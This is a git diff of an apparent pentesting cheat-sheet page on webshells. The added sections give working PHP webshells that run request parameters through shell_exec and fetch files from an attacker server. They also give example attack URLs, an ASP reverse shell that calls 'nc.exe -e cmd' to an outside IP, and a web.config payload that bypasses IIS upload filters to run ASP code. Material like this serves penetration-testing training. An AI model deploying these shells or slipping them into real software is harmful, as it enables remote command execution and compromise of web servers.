@@ -37,7 +37,7 @@ passthru\(\):
 <?php passthru($_GET['cmd']);?>
 ```
 
-Very functional shell:
+When executing certain commands such as `ps -faux`, or a simple `cat / etc / passwd`, you can see how the output shown via the web has an unpleasant aspect to read. We can fix this by adding some preformatting tags to our script:
 
 ```php
 <?php
@@ -45,7 +45,35 @@ Very functional shell:
 ?>
 ```
 
-We can a create a more functional shell as follows:
+Alternatively, we can use different functions like `shell_exec`:
+
+```php
+<?php
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+In case we want to make it **multifunctional** , we can manage the variable provided by the user who makes the request, where for the case presented below, in addition to executing commands through the variable `fexec`, we create a new variable `fupload` to transfer files from our local machine to the remote machine in the working directory:
+
+```php
+<?php
+    if(isset($_REQUEST['fexec'])){
+        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+    };
+
+    if(isset($_REQUEST['fupload'])){
+        file_put_contents($_REQUEST['fupload'], file_get_contents("http://127.0.0.1:8000/" . $_REQUEST['fupload']));
+    };
+?>
+```
+
+In this way, the user who makes the queries could carry out any of the following 3 operations:
+
+* http://10.10.10.10/filename.php?fexec=whoami
+* http://10.10.10.10/filename.php?fupload=filename.php
+* http://10.10.10.10/filename.php?fupload=filename.php&fexec=php+filename.php
+
+Alternatively, we can upload and execute the file with:
 
 ```php
 # Upload
@@ -59,6 +87,62 @@ if (isset($_GET['cmd'])) {
 };
 ?>
 ```
+
+### ASP/ASPX WebShells
+
+If the web application has the ability to upload files then we may be able to upload reverse shells:
+
+```aspnet
+<%
+Dim oS
+On Error Resume Next
+Set oS = Server.CreateObject("WSCRIPT.SHELL")
+Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
+%>
+```
+
+#### Bypass File Uploads Restrictions
+
+The web.config file plays an important role in storing IIS7 \(and higher\) settings. It is very similar to a .htaccess file in the Apache webserver. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique. Some interesting examples of this technique are accessible via the following GitHub repository: [https://github.com/KCSEC/htshells](https://github.com/KCSEC/htshells)
+
+In IIS7 \(and higher\), it is possible to do similar tricks by uploading or making a web.config file. A few of these tricks might even be applicable to IIS6 with some minor changes. The techniques below show some different web.config files that can be used to bypass protections around the file uploaders.
+
+#### Running web.config as an ASP file <a id="running-webconfig-as-an-asp-file"></a>
+
+Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes:
+
+```text
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Response.write("-"&"->")
+' it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write("<!-"&"-")
+%>
+-->
+```
+
+This text was extracted from:
+
+{% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" %}
 
 ## SecLists Shells
 
